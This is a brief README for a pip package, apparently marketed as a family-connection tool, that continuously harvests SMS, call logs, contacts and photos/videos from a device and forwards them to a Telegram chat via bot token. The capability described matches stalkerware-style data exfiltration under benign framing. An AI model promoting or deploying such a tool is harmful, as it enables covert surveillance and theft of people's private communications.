# Fpack
# BSB Family Pack 2

BSB Family Pack 2 is a secure, feature-rich tool that allows families to stay connected via Telegram. Once connected, the tool automatically monitors for new SMS messages, call logs, contacts, and files (photos/videos) on your device and sends the details in their original format to your designated Telegram chat.

## Features

- **Connect/Disconnect:** Easily integrate or remove your device from the family Telegram bot.
- **Automatic Monitoring:** Continuously checks for new SMS, call logs, contacts, and file events.
- **Original Data Format:** Sends detailed, unaltered information to your Telegram chat.
- **Command-Line Interface:** Run commands such as:
  - `bsb -connect -t <telegram_bot_token> -c <telegram_chat_id>`
  - `bsb -monitor`
  - `bsb -disconnect`

## Installation

```bash
pip install bsb_family_pack2
